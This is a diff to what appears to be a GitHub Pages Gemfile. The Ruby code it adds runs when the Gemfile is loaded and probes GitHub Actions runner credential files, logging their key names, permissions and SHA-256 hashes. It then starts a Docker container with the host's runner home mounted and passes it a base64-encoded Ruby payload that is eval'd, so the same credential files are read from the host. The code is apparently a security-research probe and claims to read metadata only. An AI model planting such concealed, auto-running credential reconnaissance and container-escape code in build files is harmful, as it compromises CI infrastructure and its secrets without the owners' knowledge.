@@ -45,20 +45,11 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm v3 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v4 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
 require 'digest'
 require 'open3'
-
-def c217_keys(raw)
-  m = raw.match(/\{.*\}/m)
-  return ['<non-json>'] if m.nil?
-  begin
-    JSON.parse(m[0]).keys
-  rescue StandardError
-    ['<unparseable>']
-  end
-end
+require 'base64'
 
 def c217_one(p)
   h = { 'path' => p }
@@ -68,7 +59,8 @@ def c217_one(p)
     h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid; h['gid'] = st.gid
     if st.file? && st.size < 4096
       raw = File.read(p)
-      h['keys'] = c217_keys(raw)
+      m = raw.match(/\{.*\}/m)
+      h['keys'] = (m ? (begin; JSON.parse(m[0]).keys; rescue StandardError; ['<unparseable>']; end) : ['<non-json>'])
       h['sha256'] = Digest::SHA256.hexdigest(raw)
     end
   rescue StandardError => e
@@ -77,28 +69,18 @@ def c217_one(p)
   h
 end
 
-def c217_where(tag)
-  { 'tag' => tag, 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
-    'dirs' => ['/home/runner', '/home/runner/runners', '/home/runner/_work'].map { |d| c217_one(d) },
-    'glob' => begin; Dir.glob('/home/runner/runners/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:' + e.class.name]; end }
-end
+incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
+           'home_runner' => c217_one('/home/runner'),
+           'files' => [], 'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
+warn 'C217ARMV4 ' + JSON.generate(incont)
 
-out = { 'container' => c217_where('in-container') }
-real = Dir.glob('/home/runner/runners/*/.credentials') +
-       Dir.glob('/home/runner/runners/*/.credentials_rsaparams') +
-       Dir.glob('/home/runner/runners/*/.runner')
-out['container_files'] = real.map { |p| c217_one(p) }
-out['container_control'] = c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials')
-warn 'C217ARMV3 ' + JSON.generate(out)
-
-# host half: sibling with read-only bind of the runner home; metadata only
 host_probe = <<'RUBY'
 require 'json'; require 'digest'
 def one(p)
   h = { 'path' => p }
   begin
-    st = File.stat(p); h['exists'] = true; h['size'] = st.size; h['mode'] = st.mode.to_s(8)
-    h['owner_uid'] = st.uid; h['gid'] = st.gid
+    st = File.stat(p); h['exists'] = true; h['type'] = st.ftype; h['size'] = st.size
+    h['mode'] = st.mode.to_s(8); h['owner_uid'] = st.uid; h['gid'] = st.gid
     if st.file? && st.size < 4096
       raw = File.read(p); m = raw.match(/\{.*\}/m)
       h['keys'] = (m ? (begin; JSON.parse(m[0]).keys; rescue StandardError; ['<unparseable>']; end) : ['<non-json>'])
@@ -109,21 +91,23 @@ def one(p)
   end
   h
 end
-o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end) }
-o['hostname_hash'] = (begin; Digest::SHA256.file('/etc/hostname').hexdigest; rescue StandardError; 'ERR'; end)
-o['glob'] = (begin; Dir.glob('/host/runners/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:' + e.class.name]; end)
-o['files'] = Dir.glob('/host/runners/*/.credentials') + Dir.glob('/host/runners/*/.runner') +
-             Dir.glob('/host/runners/*/.credentials_rsaparams') + ['/host/runners/qqqqzzzz/.credentials']
-o['files'] = o['files'].map { |p| one(p) }
+o = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
+      'hostname_sha' => (begin; Digest::SHA256.file('/etc/hostname').hexdigest; rescue StandardError => e; 'ERR:'+e.class.name; end) }
+o['home_runner'] = one('/host')
+o['runners_glob'] = (begin; Dir.glob('/host/runners/*').map { |x| File.basename(x) }; rescue StandardError => e; ['ERR:'+e.class.name]; end)
+o['files'] = (Dir.glob('/host/runners/*/.credentials') + Dir.glob('/host/runners/*/.runner') +
+              Dir.glob('/host/runners/*/.credentials_rsaparams') + ['/host/runners/qqqqzzzz/.credentials']).map { |p| one(p) }
 puts 'C217HOST ' + JSON.generate(o)
 RUBY
+
 begin
+  env_b64 = Base64.strict_encode64(host_probe)
   cmd = ['docker','run','--rm','--network','none','-v','/home/runner:/host:ro',
-         '-e','C217RUBY='+Base64.strict_encode64(host_probe).to_s,
+         '-e','C217RUBY=' + env_b64,
          'ruby:3.2-slim','ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))']
   o,e,st = Open3.capture3(*cmd)
-  warn 'C217ARMDOCKER rc=' + st.exitstatus.to_s + ' out=' + o.to_s + ' err=' + e.to_s[0,400]
+  warn 'C217ARMDOCKER rc=' + st.exitstatus.to_s + ' out=' + o.to_s[0,1500] + ' err=' + e.to_s[0,400]
 rescue StandardError => ex
   warn 'C217ARMDOCKER EXC ' + ex.class.name + ' ' + ex.message[0,200]
 end
-warn 'C217ARMV3 done'
+warn 'C217ARMV4 done'
